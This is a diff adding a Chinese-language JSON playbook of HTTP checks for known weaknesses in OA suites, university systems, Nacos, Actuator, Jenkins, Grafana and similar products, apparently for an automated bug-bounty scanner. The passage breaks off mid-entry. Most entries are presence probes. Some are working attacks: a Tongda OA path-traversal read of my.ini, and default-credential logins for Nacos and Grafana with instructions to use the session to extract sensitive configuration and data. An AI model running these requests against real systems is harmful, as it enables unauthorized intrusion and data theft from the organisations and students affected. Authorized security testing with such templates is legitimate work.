@@ -1,0 +1,1372 @@
+{
+  "_comment": "N-day 打法库。硬门槛：每条必须填 harmless_note（只读检测/无害验证说明）；只放公开已知检测型 PoC；禁止爆破字典、写操作 payload、反连。path 必以 / 开头。条目按 fingerprint 分组挂载，fallback_title_kw 供标题兜底匹配。",
+  "entries": [
+    {
+      "id": "tongda-oa-gateway-file-read",
+      "fingerprint": "oa_tongda",
+      "fallback_title_kw": [
+        "通达oa",
+        "tongda"
+      ],
+      "name": "通达OA gateway 接口任意文件读取检测",
+      "vuln_type": "arbitrary_file_read",
+      "severity_hint": "high",
+      "check": {
+        "method": "POST",
+        "path": "/ispirit/interface/gateway.php",
+        "headers": {
+          "Content-Type": "application/x-www-form-urlencoded"
+        },
+        "body": "json={\"url\":\"/general/../../mysql5/my.ini\",\"name\":\"1.txt\"}"
+      },
+      "match": {
+        "status_in": [
+          200
+        ],
+        "body_contains_all": [
+          "[mysql]"
+        ],
+        "body_len_gt": 50
+      },
+      "next": "命中后换读其它配置文件（如 oa.config.php）证明可读范围，按 arbitrary_file_read 提交，贴出文件内容证据；严禁写入/上传变体",
+      "harmless_note": "只读探测，仅读取服务器配置文件证明存在漏洞，无写入/删除动作"
+    },
+    {
+      "id": "tongda-oa-login-presence",
+      "fingerprint": "oa_tongda",
+      "fallback_title_kw": [
+        "通达oa"
+      ],
+      "name": "通达OA 登录页与版本信息确认",
+      "vuln_type": "info_probe",
+      "severity_hint": "low",
+      "check": {
+        "method": "GET",
+        "path": "/logincheck_code.php"
+      },
+      "match": {
+        "status_in": [
+          200,
+          302
+        ]
+      },
+      "next": "仅用于确认通达 OA 存活与版本线索，为其它通达打法提供上下文",
+      "harmless_note": "GET 探活，无任何利用动作"
+    },
+    {
+      "id": "seeyon-console-presence",
+      "fingerprint": "oa_seeyon",
+      "fallback_title_kw": [
+        "致远",
+        "seeyon"
+      ],
+      "name": "致远 OA 管理控制台可达性检测",
+      "vuln_type": "unauthorized_access",
+      "severity_hint": "medium",
+      "check": {
+        "method": "GET",
+        "path": "/seeyon/management/index.jsp"
+      },
+      "match": {
+        "status_in": [
+          200
+        ],
+        "body_contains_any": [
+          "管理",
+          "login",
+          "password",
+          "seeyon"
+        ]
+      },
+      "next": "命中说明管理控制台对外可达；结合登录接口响应特征判断是否有默认口令线索；只做只读检测，严禁口令猜测",
+      "harmless_note": "GET 存在性探测，不提交任何凭据"
+    },
+    {
+      "id": "seeyon-version-leak",
+      "fingerprint": "oa_seeyon",
+      "fallback_title_kw": [
+        "致远"
+      ],
+      "name": "致远 OA 版本信息接口检测",
+      "vuln_type": "info_probe",
+      "severity_hint": "low",
+      "check": {
+        "method": "GET",
+        "path": "/seeyon/main.do?method=getTime"
+      },
+      "match": {
+        "status_in": [
+          200
+        ]
+      },
+      "next": "仅确认致远存活与响应特征，辅助后续指纹判断",
+      "harmless_note": "GET 只读探测，返回时间戳信息"
+    },
+    {
+      "id": "weaver-api-presence",
+      "fingerprint": "oa_weaver",
+      "fallback_title_kw": [
+        "泛微",
+        "weaver",
+        "ecology"
+      ],
+      "name": "泛微 e-cology API 路由可达性检测",
+      "vuln_type": "info_probe",
+      "severity_hint": "low",
+      "check": {
+        "method": "GET",
+        "path": "/api/"
+      },
+      "match": {
+        "status_in": [
+          200,
+          301,
+          302,
+          403
+        ]
+      },
+      "next": "确认泛微 API 网关存在后，从 JS/接口文档角度找未授权只读接口，禁止使用任何写操作 payload",
+      "harmless_note": "GET 存在性探测"
+    },
+    {
+      "id": "weaver-workflow-tree-unauth",
+      "fingerprint": "oa_weaver",
+      "fallback_title_kw": [
+        "泛微",
+        "ecology"
+      ],
+      "name": "泛微 WorkflowCenterTreeData 未授权访问检测",
+      "vuln_type": "unauthorized_access",
+      "severity_hint": "medium",
+      "check": {
+        "method": "GET",
+        "path": "/mobile/browser/WorkflowCenterTreeData.jsp?isCompany=1"
+      },
+      "match": {
+        "status_in": [
+          200
+        ],
+        "body_contains_any": [
+          "[",
+          "id"
+        ]
+      },
+      "next": "命中说明接口未鉴权返回组织/流程树数据；按 unauthorized_access 提交，贴响应证据；不要遍历大量数据，取少量样本即可",
+      "harmless_note": "GET 只读，仅取一次响应样本证明未授权，不批量拉取"
+    },
+    {
+      "id": "cas-login-param-echo",
+      "fingerprint": "sso_cas",
+      "fallback_title_kw": [
+        "统一身份认证",
+        "cas",
+        "统一认证"
+      ],
+      "name": "CAS 登录页与 service 参数回显检测",
+      "vuln_type": "info_probe",
+      "severity_hint": "low",
+      "check": {
+        "method": "GET",
+        "path": "/cas/login?service=http%3A%2F%2Fexample.invalid%2Fcb"
+      },
+      "match": {
+        "status_in": [
+          200
+        ]
+      },
+      "next": "从登录页 HTML 提取 lt/execution 隐藏字段与表单结构，为后续会话分析做准备；service 回显仅作记录，纯开放跳转不提交",
+      "harmless_note": "GET 只读，example.invalid 不会命中任何真实服务"
+    },
+    {
+      "id": "cas-logout-presence",
+      "fingerprint": "sso_cas",
+      "fallback_title_kw": [
+        "cas"
+      ],
+      "name": "CAS logout 端点确认",
+      "vuln_type": "info_probe",
+      "severity_hint": "low",
+      "check": {
+        "method": "GET",
+        "path": "/cas/logout"
+      },
+      "match": {
+        "status_in": [
+          200,
+          302
+        ]
+      },
+      "next": "确认 CAS 服务边界；重点转向 /cas/login 页面 JS 与隐藏字段分析，寻找未授权接口",
+      "harmless_note": "GET 只读探测"
+    },
+    {
+      "id": "zfsoft-jwglxt-unauth",
+      "fingerprint": "edu_zhengfang",
+      "fallback_title_kw": [
+        "正方",
+        "zfsoft",
+        "jwglxt"
+      ],
+      "name": "正方教务系统 jwglxt 接口未授权检测",
+      "vuln_type": "unauthorized_access",
+      "severity_hint": "medium",
+      "check": {
+        "method": "GET",
+        "path": "/jwglxt/xlgl/xlcx/xlccx_cxIndex.html"
+      },
+      "match": {
+        "status_in": [
+          200
+        ]
+      },
+      "next": "命中说明教务前端路由未强制鉴权；继续探测同族只读查询接口（非登录态调用），取少量样本证明未授权；严禁登录尝试",
+      "harmless_note": "GET 只读探测，不提交凭据、不写库"
+    },
+    {
+      "id": "qiangzhi-jw-presence",
+      "fingerprint": "edu_jwgl",
+      "fallback_title_kw": [
+        "教务",
+        "强智",
+        "jwgl"
+      ],
+      "name": "强智教务系统框架入口确认",
+      "vuln_type": "info_probe",
+      "severity_hint": "low",
+      "check": {
+        "method": "GET",
+        "path": "/jsxsd/framework/xsMain.html"
+      },
+      "match": {
+        "status_in": [
+          200,
+          302
+        ]
+      },
+      "next": "确认强智框架后，排查 xsMain 同目录只读页面与接口的未授权访问；不要尝试登录",
+      "harmless_note": "GET 只读探测"
+    },
+    {
+      "id": "druid-unauth-index",
+      "fingerprint": "mw_druid",
+      "fallback_title_kw": [
+        "druid"
+      ],
+      "name": "Druid 监控未授权访问检测",
+      "vuln_type": "unauthorized_access",
+      "severity_hint": "medium",
+      "check": {
+        "method": "GET",
+        "path": "/druid/index.html"
+      },
+      "match": {
+        "status_in": [
+          200
+        ],
+        "body_contains_any": [
+          "druid",
+          "stat",
+          "数据源"
+        ]
+      },
+      "next": "命中后访问 /druid/datasource.json 确认数据源信息暴露程度；只读取证，重点看 URI 监控与数据源配置是否含密码线索；未提出可用凭证不要按高危提交",
+      "harmless_note": "GET 只读监控页面，不触发任何连接操作"
+    },
+    {
+      "id": "druid-datasource-json",
+      "fingerprint": "mw_druid",
+      "fallback_title_kw": [
+        "druid"
+      ],
+      "name": "Druid 数据源 JSON 未授权读取",
+      "vuln_type": "unauthorized_access",
+      "severity_hint": "medium",
+      "check": {
+        "method": "GET",
+        "path": "/druid/datasource.json"
+      },
+      "match": {
+        "status_in": [
+          200
+        ],
+        "body_contains_any": [
+          "userName",
+          "url",
+          "jdbc"
+        ]
+      },
+      "next": "记录暴露的连接串与用户名字段；密码字段若为明文且可验证需按平台口径实证后才算可用凭证，只读取证不连接数据库",
+      "harmless_note": "GET 只读 JSON，不发起数据库连接"
+    },
+    {
+      "id": "nacos-unauth-users",
+      "fingerprint": "mw_nacos",
+      "fallback_title_kw": [
+        "nacos"
+      ],
+      "name": "Nacos 用户列表未授权访问检测",
+      "vuln_type": "unauthorized_access",
+      "severity_hint": "high",
+      "check": {
+        "method": "GET",
+        "path": "/nacos/v1/auth/users?pageNo=1&pageSize=1"
+      },
+      "match": {
+        "status_in": [
+          200
+        ],
+        "body_contains_any": [
+          "username",
+          "pageItems"
+        ]
+      },
+      "next": "命中说明 Nacos 未授权；按 unauthorized_access 提交并说明可进一步影响配置中心；严禁修改任何用户或配置",
+      "harmless_note": "GET 只读列表，pageSize=1 仅取一条样本"
+    },
+    {
+      "id": "nacos-console-presence",
+      "fingerprint": "mw_nacos",
+      "fallback_title_kw": [
+        "nacos"
+      ],
+      "name": "Nacos 控制台可达性检测",
+      "vuln_type": "info_probe",
+      "severity_hint": "low",
+      "check": {
+        "method": "GET",
+        "path": "/nacos/"
+      },
+      "match": {
+        "status_in": [
+          200,
+          302
+        ],
+        "body_contains_any": [
+          "nacos"
+        ]
+      },
+      "next": "确认 Nacos 控制台存在，为未授权接口检测提供路径前缀线索",
+      "harmless_note": "GET 只读探测"
+    },
+    {
+      "id": "actuator-env-unauth",
+      "fingerprint": "framework_springboot",
+      "fallback_title_kw": [
+        "whitelabel",
+        "springboot",
+        "actuator"
+      ],
+      "name": "Spring Boot Actuator env 端点未授权检测",
+      "vuln_type": "unauthorized_access",
+      "severity_hint": "high",
+      "check": {
+        "method": "GET",
+        "path": "/actuator/env"
+      },
+      "match": {
+        "status_in": [
+          200
+        ],
+        "body_contains_any": [
+          "propertySources",
+          "\"properties\""
+        ]
+      },
+      "next": "命中后检查响应中是否有密码类配置项占位；未提取出可用凭证前不得按可利用凭证口径提交；只读取证，禁止访问 /actuator/shutdown 等写操作端点",
+      "harmless_note": "GET 只读配置读取，严禁调用任何 POST 型 actuator 端点"
+    },
+    {
+      "id": "actuator-mappings-unauth",
+      "fingerprint": "framework_springboot",
+      "fallback_title_kw": [
+        "actuator"
+      ],
+      "name": "Actuator mappings 端点未授权检测",
+      "vuln_type": "unauthorized_access",
+      "severity_hint": "medium",
+      "check": {
+        "method": "GET",
+        "path": "/actuator/mappings"
+      },
+      "match": {
+        "status_in": [
+          200
+        ],
+        "body_contains_any": [
+          "handlers",
+          "servlets"
+        ]
+      },
+      "next": "用 mappings 列表扩大攻击面认知（找出隐藏接口），再按接口逐个做未授权只读验证",
+      "harmless_note": "GET 只读路由清单"
+    },
+    {
+      "id": "swagger-api-docs-unauth",
+      "fingerprint": "api_swagger",
+      "fallback_title_kw": [
+        "swagger"
+      ],
+      "name": "Swagger API 文档未授权暴露检测",
+      "vuln_type": "unauthorized_access",
+      "severity_hint": "low",
+      "check": {
+        "method": "GET",
+        "path": "/v2/api-docs"
+      },
+      "match": {
+        "status_in": [
+          200
+        ],
+        "body_contains_any": [
+          "swagger",
+          "\"paths\""
+        ]
+      },
+      "next": "从文档 paths 中挑选 GET 类只读接口做未授权验证；文档暴露本身通常低危，要结合未授权调用的实际危害定级",
+      "harmless_note": "GET 只读文档"
+    },
+    {
+      "id": "phpmyadmin-presence",
+      "fingerprint": "db_phpmyadmin",
+      "fallback_title_kw": [
+        "phpmyadmin"
+      ],
+      "name": "phpMyAdmin 管理入口暴露检测",
+      "vuln_type": "unauthorized_access",
+      "severity_hint": "medium",
+      "check": {
+        "method": "GET",
+        "path": "/phpmyadmin/index.php"
+      },
+      "match": {
+        "status_in": [
+          200
+        ],
+        "body_contains_any": [
+          "phpMyAdmin",
+          "phpmyadmin"
+        ]
+      },
+      "next": "命中说明管理入口对外可达；按平台口径记录（口令问题不在授权范围，严禁尝试登录）；检查版本号与 setup 页面是否暴露",
+      "harmless_note": "GET 存在性探测，不提交任何凭据"
+    },
+    {
+      "id": "grafana-anon-health",
+      "fingerprint": "mw_grafana",
+      "fallback_title_kw": [
+        "grafana"
+      ],
+      "name": "Grafana 匿名访问与健康端点检测",
+      "vuln_type": "unauthorized_access",
+      "severity_hint": "medium",
+      "check": {
+        "method": "GET",
+        "path": "/api/health"
+      },
+      "match": {
+        "status_in": [
+          200
+        ],
+        "body_contains_any": [
+          "database",
+          "version"
+        ]
+      },
+      "next": "健康端点正常开放是常态；重点验证 /api/org、/api/users 等管理接口是否匿名可读（GET 取一条样本）；严禁改任何配置",
+      "harmless_note": "GET 只读接口"
+    },
+    {
+      "id": "kibana-status-unauth",
+      "fingerprint": "mw_kibana",
+      "fallback_title_kw": [
+        "kibana"
+      ],
+      "name": "Kibana 状态端点未授权检测",
+      "vuln_type": "unauthorized_access",
+      "severity_hint": "medium",
+      "check": {
+        "method": "GET",
+        "path": "/api/status"
+      },
+      "match": {
+        "status_in": [
+          200
+        ],
+        "body_contains_any": [
+          "elastic",
+          "version",
+          "status"
+        ]
+      },
+      "next": "命中后探测 /app/kibana 是否匿名可达、/elasticsearch 代理是否未授权（GET _cat/indices 取一条）；严禁写任何索引",
+      "harmless_note": "GET 只读状态与清单"
+    },
+    {
+      "id": "coremail-presence",
+      "fingerprint": "mail_coremail",
+      "fallback_title_kw": [
+        "coremail"
+      ],
+      "name": "Coremail 邮件系统入口确认",
+      "vuln_type": "info_probe",
+      "severity_hint": "low",
+      "check": {
+        "method": "GET",
+        "path": "/coremail/"
+      },
+      "match": {
+        "status_in": [
+          200,
+          302
+        ],
+        "body_contains_any": [
+          "coremail"
+        ]
+      },
+      "next": "确认 Coremail 后检查版本信息接口与常见只读参数；只做存在性判断，不做任何登录尝试",
+      "harmless_note": "GET 只读探测"
+    },
+    {
+      "id": "ruoyi-captcha-presence",
+      "fingerprint": "framework_ruoyi",
+      "fallback_title_kw": [
+        "若依",
+        "ruoyi"
+      ],
+      "name": "若依框架特征端点确认",
+      "vuln_type": "info_probe",
+      "severity_hint": "low",
+      "check": {
+        "method": "GET",
+        "path": "/captchaImage"
+      },
+      "match": {
+        "status_in": [
+          200
+        ],
+        "body_contains_any": [
+          "img",
+          "captchaEnabled",
+          "uuid"
+        ]
+      },
+      "next": "确认若依框架后，重点检测 /system/* 管理接口族在无 token 时的响应差异（401 vs 200）；严禁爆破 token 或口令",
+      "harmless_note": "GET 只读验证码接口（不提交验证）"
+    },
+    {
+      "id": "jeecg-api-presence",
+      "fingerprint": "framework_jeecg",
+      "fallback_title_kw": [
+        "jeecg"
+      ],
+      "name": "JeecgBoot 框架特征端点确认",
+      "vuln_type": "info_probe",
+      "severity_hint": "low",
+      "check": {
+        "method": "GET",
+        "path": "/sys/getEncryptedString"
+      },
+      "match": {
+        "status_in": [
+          200
+        ],
+        "body_contains_any": [
+          "key",
+          "iv"
+        ]
+      },
+      "next": "命中说明 jeecg 默认接口暴露；结合返回的加密 key/iv 线索评估默认鉴权实现，只读取证；严禁实际伪造登录",
+      "harmless_note": "GET 只读，记录默认加密配置暴露"
+    },
+    {
+      "id": "thinkphp-trace-presence",
+      "fingerprint": "framework_thinkphp",
+      "fallback_title_kw": [
+        "thinkphp"
+      ],
+      "name": "ThinkPHP 框架 trace 调试信息检测",
+      "vuln_type": "info_probe",
+      "severity_hint": "low",
+      "check": {
+        "method": "GET",
+        "path": "/index.php"
+      },
+      "match": {
+        "status_in": [
+          200
+        ],
+        "body_contains_any": [
+          "thinkphp",
+          "think\\"
+        ]
+      },
+      "next": "确认 ThinkPHP 版本特征后检查是否暴露 trace/debug 信息页；版本对应的历史漏洞仅做只读检测，不使用任何注入类 payload",
+      "harmless_note": "GET 只读首页特征判断"
+    },
+    {
+      "id": "fastadmin-presence",
+      "fingerprint": "framework_fastadmin",
+      "fallback_title_kw": [
+        "fastadmin"
+      ],
+      "name": "FastAdmin 后台入口暴露检测",
+      "vuln_type": "unauthorized_access",
+      "severity_hint": "medium",
+      "check": {
+        "method": "GET",
+        "path": "/admin.php"
+      },
+      "match": {
+        "status_in": [
+          200,
+          302
+        ]
+      },
+      "next": "确认 FastAdmin 后台路径存在；检查 /admin/index/login 页面是否暴露安装/调试信息；不做任何登录尝试",
+      "harmless_note": "GET 存在性探测"
+    },
+    {
+      "id": "sangfor-vpn-presence",
+      "fingerprint": "vpn_sangfor",
+      "fallback_title_kw": [
+        "深信服",
+        "sangfor"
+      ],
+      "name": "深信服 SSL VPN 登录入口确认",
+      "vuln_type": "info_probe",
+      "severity_hint": "low",
+      "check": {
+        "method": "GET",
+        "path": "/por/login.csp"
+      },
+      "match": {
+        "status_in": [
+          200,
+          302
+        ]
+      },
+      "next": "确认深信服 VPN 后，检查登录页版本号信息；历史已知漏洞仅做只读存在性判断，严禁任何利用尝试",
+      "harmless_note": "GET 只读探测"
+    },
+    {
+      "id": "webvpn-presence",
+      "fingerprint": "vpn_webvpn",
+      "fallback_title_kw": [
+        "webvpn"
+      ],
+      "name": "WebVPN 网关入口确认",
+      "vuln_type": "info_probe",
+      "severity_hint": "low",
+      "check": {
+        "method": "GET",
+        "path": "/"
+      },
+      "match": {
+        "status_in": [
+          200
+        ],
+        "body_contains_any": [
+          "webvpn",
+          "w engine"
+        ]
+      },
+      "next": "确认 WebVPN 后关注版本信息与登录页 JS；只做指纹与版本确认",
+      "harmless_note": "GET 只读探测"
+    },
+    {
+      "id": "cisco-vpn-presence",
+      "fingerprint": "vpn_cisco",
+      "fallback_title_kw": [
+        "anyconnect",
+        "sslvpn"
+      ],
+      "name": "Cisco AnyConnect/SSL VPN 入口确认",
+      "vuln_type": "info_probe",
+      "severity_hint": "low",
+      "check": {
+        "method": "GET",
+        "path": "/+CSCOE+/logon.html"
+      },
+      "match": {
+        "status_in": [
+          200
+        ],
+        "body_contains_any": [
+          "anyconnect",
+          "cisco",
+          "vpn"
+        ]
+      },
+      "next": "确认 Cisco VPN 后记录版本线索；不做任何利用",
+      "harmless_note": "GET 只读探测"
+    },
+    {
+      "id": "fineviewer-decision-presence",
+      "fingerprint": "report_fineviewer",
+      "fallback_title_kw": [
+        "帆软",
+        "finereport",
+        "decision"
+      ],
+      "name": "帆软 decision 平台入口确认",
+      "vuln_type": "info_probe",
+      "severity_hint": "low",
+      "check": {
+        "method": "GET",
+        "path": "/decision/login"
+      },
+      "match": {
+        "status_in": [
+          200,
+          302
+        ]
+      },
+      "next": "确认帆软平台后检查 /WebReport/ 与 /decision/ 路径族；只做存在性判断与版本线索记录",
+      "harmless_note": "GET 只读探测"
+    },
+    {
+      "id": "fineviewer-webreport-directory",
+      "fingerprint": "report_fineviewer",
+      "fallback_title_kw": [
+        "finereport",
+        "webreport"
+      ],
+      "name": "帆软 WebReport 目录遍历检测（只读验证）",
+      "vuln_type": "unauthorized_access",
+      "severity_hint": "medium",
+      "check": {
+        "method": "GET",
+        "path": "/WebReport/decision/view/report?viewlet=dashboard"
+      },
+      "match": {
+        "status_in": [
+          200,
+          403,
+          302
+        ]
+      },
+      "next": "响应 200 且返回报表内容说明未授权可读，按实际读到的数据敏感度定级；403/302 说明有鉴权，收敛；严禁使用任何参数注入变体",
+      "harmless_note": "GET 只读探测，不导出报表数据"
+    },
+    {
+      "id": "jmreport-presence",
+      "fingerprint": "report_jimu",
+      "fallback_title_kw": [
+        "jmreport",
+        "积木报表"
+      ],
+      "name": "积木报表 jmreport 入口确认",
+      "vuln_type": "info_probe",
+      "severity_hint": "low",
+      "check": {
+        "method": "GET",
+        "path": "/jmreport/list"
+      },
+      "match": {
+        "status_in": [
+          200,
+          401,
+          403
+        ]
+      },
+      "next": "200 且返回报表列表说明未授权可读（记录列表条数作样本，不逐个打开）；401/403 说明有鉴权",
+      "harmless_note": "GET 只读探测，只取一次响应"
+    },
+    {
+      "id": "ureport-presence",
+      "fingerprint": "report_ureport",
+      "fallback_title_kw": [
+        "ureport"
+      ],
+      "name": "UReport 报表入口确认",
+      "vuln_type": "info_probe",
+      "severity_hint": "low",
+      "check": {
+        "method": "GET",
+        "path": "/ureport/designer"
+      },
+      "match": {
+        "status_in": [
+          200,
+          302,
+          401,
+          403
+        ]
+      },
+      "next": "200 说明报表设计器对外可达（本身低危，记录即可）；重点转向 /ureport/load 等只读数据接口的未授权验证",
+      "harmless_note": "GET 只读探测，严禁调用任何保存/执行类设计器接口"
+    },
+    {
+      "id": "landray-presence",
+      "fingerprint": "oa_landray",
+      "fallback_title_kw": [
+        "蓝凌",
+        "landray"
+      ],
+      "name": "蓝凌 OA 入口确认",
+      "vuln_type": "info_probe",
+      "severity_hint": "low",
+      "check": {
+        "method": "GET",
+        "path": "/sys/ui/extend/theme/default/style/common.css"
+      },
+      "match": {
+        "status_in": [
+          200,
+          404
+        ]
+      },
+      "next": "确认蓝凌框架后，排查 /sys/ 路径族的未授权只读接口；禁止任何写操作",
+      "harmless_note": "GET 只读静态资源探测"
+    },
+    {
+      "id": "wanhu-presence",
+      "fingerprint": "oa_wanhu",
+      "fallback_title_kw": [
+        "万户",
+        "wanhu"
+      ],
+      "name": "万户 OA 入口确认",
+      "vuln_type": "info_probe",
+      "severity_hint": "low",
+      "check": {
+        "method": "GET",
+        "path": "/defaultroot/index.jsp"
+      },
+      "match": {
+        "status_in": [
+          200,
+          302
+        ]
+      },
+      "next": "确认万户框架后排查 /defaultroot/ 下的未授权只读接口与前端 JS；禁止登录尝试",
+      "harmless_note": "GET 只读探测"
+    },
+    {
+      "id": "jenkins-anon-presence",
+      "fingerprint": "mw_jenkins",
+      "fallback_title_kw": [
+        "jenkins"
+      ],
+      "name": "Jenkins 匿名可读检测",
+      "vuln_type": "unauthorized_access",
+      "severity_hint": "medium",
+      "check": {
+        "method": "GET",
+        "path": "/api/json"
+      },
+      "match": {
+        "status_in": [
+          200
+        ],
+        "body_contains_any": [
+          "jobs",
+          "assignedLabels",
+          "mode"
+        ]
+      },
+      "next": "命中说明 Jenkins 匿名可读 API；记录暴露的 job 名称与视图信息作为未授权访问证据；严禁触发任何 build/操作",
+      "harmless_note": "GET 只读 API，不触发构建"
+    },
+    {
+      "id": "jenkins-scriptconsole-check",
+      "fingerprint": "mw_jenkins",
+      "fallback_title_kw": [
+        "jenkins"
+      ],
+      "name": "Jenkins Script Console 可达性探测（仅状态码）",
+      "vuln_type": "info_probe",
+      "severity_hint": "high",
+      "check": {
+        "method": "GET",
+        "path": "/script"
+      },
+      "match": {
+        "status_in": [
+          200,
+          403
+        ]
+      },
+      "next": "仅记录状态码：200 说明脚本控制台对外可达（高危线索，需人工判断是否真匿名可执行）；严禁提交任何 Groovy 脚本",
+      "harmless_note": "GET 只读页面探测，绝不执行任何脚本"
+    },
+    {
+      "id": "minio-presence",
+      "fingerprint": "mw_minio",
+      "fallback_title_kw": [
+        "minio"
+      ],
+      "name": "MinIO 控制台/服务确认",
+      "vuln_type": "info_probe",
+      "severity_hint": "low",
+      "check": {
+        "method": "GET",
+        "path": "/minio/health/live"
+      },
+      "match": {
+        "status_in": [
+          200
+        ]
+      },
+      "next": "确认 MinIO 存活后探测 /minio/ 控制台是否匿名可达；桶列表未授权验证只取一条；严禁任何写/删操作",
+      "harmless_note": "GET 健康检查与只读探测"
+    },
+    {
+      "id": "harbor-presence",
+      "fingerprint": "mw_harbor",
+      "fallback_title_kw": [
+        "harbor"
+      ],
+      "name": "Harbor 镜像仓库 API 确认",
+      "vuln_type": "info_probe",
+      "severity_hint": "low",
+      "check": {
+        "method": "GET",
+        "path": "/api/v2.0/health"
+      },
+      "match": {
+        "status_in": [
+          200
+        ],
+        "body_contains_any": [
+          "healthy",
+          "status"
+        ]
+      },
+      "next": "确认 Harbor 后探测 /api/v2.0/projects 匿名可读性；200 且返回项目列表说明未授权（记录项目名作样本）；严禁删除任何镜像",
+      "harmless_note": "GET 只读健康检查与项目列表探测"
+    },
+    {
+      "id": "gitlab-presence",
+      "fingerprint": "git_gitlab",
+      "fallback_title_kw": [
+        "gitlab"
+      ],
+      "name": "GitLab 实例确认",
+      "vuln_type": "info_probe",
+      "severity_hint": "low",
+      "check": {
+        "method": "GET",
+        "path": "/api/v4/version"
+      },
+      "match": {
+        "status_in": [
+          200,
+          401,
+          403
+        ]
+      },
+      "next": "200 说明版本接口匿名可读（记录版本号）；401/403 正常；结合 /users、/projects 匿名可读性判断暴露面；严禁任何写操作",
+      "harmless_note": "GET 只读 API 探测"
+    },
+    {
+      "id": "xgxt-presence",
+      "fingerprint": "edu_xgxt",
+      "fallback_title_kw": [
+        "学工",
+        "学生工作"
+      ],
+      "name": "学工系统入口确认",
+      "vuln_type": "info_probe",
+      "severity_hint": "low",
+      "check": {
+        "method": "GET",
+        "path": "/"
+      },
+      "match": {
+        "status_in": [
+          200
+        ],
+        "body_contains_any": [
+          "学工",
+          "学生"
+        ]
+      },
+      "next": "确认学工系统后从未登录可达的公告/查询接口入手，测参数越权（学号/ID 取少量样本）；禁止登录尝试",
+      "harmless_note": "GET 只读探测"
+    },
+    {
+      "id": "jeesite-presence",
+      "fingerprint": "framework_jeesite",
+      "fallback_title_kw": [
+        "jeesite"
+      ],
+      "name": "JeeSite 框架确认",
+      "vuln_type": "info_probe",
+      "severity_hint": "low",
+      "check": {
+        "method": "GET",
+        "path": "/a/login"
+      },
+      "match": {
+        "status_in": [
+          200,
+          302
+        ]
+      },
+      "next": "确认 JeeSite 后排查 /a/ 路径族未授权只读接口与 JS 暴露面；禁止口令猜测",
+      "harmless_note": "GET 只读探测"
+    },
+    {
+      "id": "springblade-presence",
+      "fingerprint": "framework_springblade",
+      "fallback_title_kw": [
+        "springblade",
+        "bladex",
+        "saber"
+      ],
+      "name": "SpringBlade 框架特征确认",
+      "vuln_type": "info_probe",
+      "severity_hint": "low",
+      "check": {
+        "method": "GET",
+        "path": "/blade-system/menu/list"
+      },
+      "match": {
+        "status_in": [
+          200,
+          401,
+          403
+        ]
+      },
+      "next": "200 说明 /blade-* 接口族未鉴权（记录返回内容样本）；401/403 有鉴权；转向 blade-auth 相关只读接口探测；严禁伪造 token 登录",
+      "harmless_note": "GET 只读探测"
+    },
+    {
+      "id": "exchange-owa-presence",
+      "fingerprint": "mail_exchange",
+      "fallback_title_kw": [
+        "owa",
+        "exchange"
+      ],
+      "name": "Exchange OWA 入口确认",
+      "vuln_type": "info_probe",
+      "severity_hint": "low",
+      "check": {
+        "method": "GET",
+        "path": "/owa/auth/logon.aspx"
+      },
+      "match": {
+        "status_in": [
+          200,
+          302
+        ]
+      },
+      "next": "确认 Exchange OWA 后记录版本线索（页面页脚/UA 特征）；只做存在性判断，严禁任何登录尝试",
+      "harmless_note": "GET 只读探测"
+    },
+    {
+      "id": "freshman-yxxt-presence",
+      "fingerprint": "edu_freshman",
+      "fallback_title_kw": [
+        "迎新",
+        "新生报到"
+      ],
+      "name": "迎新系统入口确认",
+      "vuln_type": "info_probe",
+      "severity_hint": "low",
+      "check": {
+        "method": "GET",
+        "path": "/"
+      },
+      "match": {
+        "status_in": [
+          200
+        ],
+        "body_contains_any": [
+          "迎新",
+          "新生",
+          "报到"
+        ]
+      },
+      "next": "确认迎新系统后，从未登录可达的报到进度/宿舍分配查询接口入手，测参数越权（取少量样本）；禁止登录尝试",
+      "harmless_note": "GET 只读探测"
+    },
+    {
+      "id": "nacos-default-cred-check",
+      "fingerprint": "mw_nacos",
+      "fallback_title_kw": [
+        "nacos"
+      ],
+      "name": "Nacos 出厂默认口令核查（nacos/nacos，仅默认值）",
+      "vuln_type": "default_credential",
+      "severity_hint": "high",
+      "check": {
+        "method": "POST",
+        "path": "/nacos/v1/auth/users/login",
+        "headers": {
+          "Content-Type": "application/x-www-form-urlencoded"
+        },
+        "body": "username=nacos&password=nacos"
+      },
+      "match": {
+        "status_in": [
+          200
+        ],
+        "body_contains_all": [
+          "accessToken"
+        ]
+      },
+      "next": "命中说明存在出厂默认口令；不要就此提交——用该登录态继续只读深挖（如配置列表/用户列表），实证拿到敏感配置或数据后才按实际危害提交；严禁修改任何配置或密码",
+      "harmless_note": "仅提交厂商文档公开的出厂默认组合 nacos/nacos 一次，非爆破不遍历；命中后只做只读深挖"
+    },
+    {
+      "id": "jenkins-initwizard-check",
+      "fingerprint": "mw_jenkins",
+      "fallback_title_kw": [
+        "jenkins"
+      ],
+      "name": "Jenkins 未完成初始化状态核查（可创建管理员）",
+      "vuln_type": "default_credential",
+      "severity_hint": "high",
+      "check": {
+        "method": "GET",
+        "path": "/jenkins/installWizard"
+      },
+      "match": {
+        "status_in": [
+          200
+        ],
+        "body_contains_any": [
+          "Getting Started",
+          "Create First Admin User",
+          "Unlock Jenkins"
+        ]
+      },
+      "next": "命中说明 Jenkins 处于未完成初始化状态（任何人可创建管理员）；记录页面证据按 unauthorized_access 提交；严禁真的创建账号或执行脚本",
+      "harmless_note": "GET 只读检测初始化向导是否暴露，不创建任何账号"
+    },
+    {
+      "id": "grafana-default-cred-check",
+      "fingerprint": "mw_grafana",
+      "fallback_title_kw": [
+        "grafana"
+      ],
+      "name": "Grafana 出厂默认口令核查（admin/admin，仅默认值）",
+      "vuln_type": "default_credential",
+      "severity_hint": "medium",
+      "check": {
+        "method": "POST",
+        "path": "/login",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": "{\"user\":\"admin\",\"password\":\"admin\"}"
+      },
+      "match": {
+        "status_in": [
+          200
+        ],
+        "body_contains_any": [
+          "Logged in"
+        ]
+      },
+      "next": "命中说明出厂默认口令未改；用登录态只读深挖（数据源配置/用户列表/仪表盘），实证敏感数据后按实际危害提交；严禁改任何配置",
+      "harmless_note": "仅提交厂商文档公开的出厂默认组合 admin/admin 一次，非爆破不遍历"
+    },
+    {
+      "id": "phpmyadmin-root-empty-check",
+      "fingerprint": "db_phpmyadmin",
+      "fallback_title_kw": [
+        "phpmyadmin"
+      ],
+      "name": "phpMyAdmin root 空口令核查（仅 MySQL 出厂态）",
+      "vuln_type": "default_credential",
+      "severity_hint": "high",
+      "check": {
+        "method": "POST",
+        "path": "/phpmyadmin/index.php",
